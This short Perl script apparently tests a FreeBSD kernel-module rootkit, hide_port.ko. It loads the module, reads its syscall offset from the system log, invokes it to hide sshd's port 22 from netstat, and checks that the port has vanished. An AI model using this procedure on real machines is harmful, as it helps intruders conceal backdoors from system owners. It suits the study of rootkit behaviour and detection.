#!/usr/bin/perl

my $mod = './hide_port.ko';

unless (-e $mod) {
    die "File <$mod> could not be found in the current directory.";
} 

my $res = system "kldload $mod";
if ($res != 0) {
    system "kldunload $mod";
    die "Kernel module failed to load correctly (exit $res).\n";
} 

my $tail = `tail /var/log/messages`;
if ($tail =~ /hide port loaded at offset (\d+)/) {
    $offset = $1;
} else {
    die "Could not find offset."
}

my $res = `netstat -anp tcp`;
if ($res !~ /\*\.22/) {
    die "sshd is not listening, or the rootkit has already been loaded ;).\n";
}

syscall(int $offset, 22);

my $res = `netstat -anp tcp`;
if ($res =~ /\*\.22/) {
    die "Netcat can still see port 22....\n";
}

my $res = system "kldunload $mod";
if ($res != 0) {
    die "Kernel module failed to unload correctly (exit $res).\n";
} 

print "All tests passed.\n";
